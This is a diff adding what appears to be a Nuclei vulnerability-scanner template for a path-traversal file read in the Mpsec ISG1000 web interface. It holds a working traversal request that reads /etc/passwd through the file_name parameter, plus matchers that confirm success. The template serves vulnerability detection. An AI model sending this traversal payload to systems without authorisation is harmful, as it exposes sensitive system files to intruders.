@@ -1,0 +1,29 @@
+id: poc-yaml-mpsec-isg1000-file-read
+info:
+  name: Mpsec Isg1000 File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects file read vulnerability in Mpsec Isg1000 by accessing sensitive files like /etc/passwd.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "text/plain"
+          - "set-cookie"
+          - "USGSESSID="
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]?:0:0:"
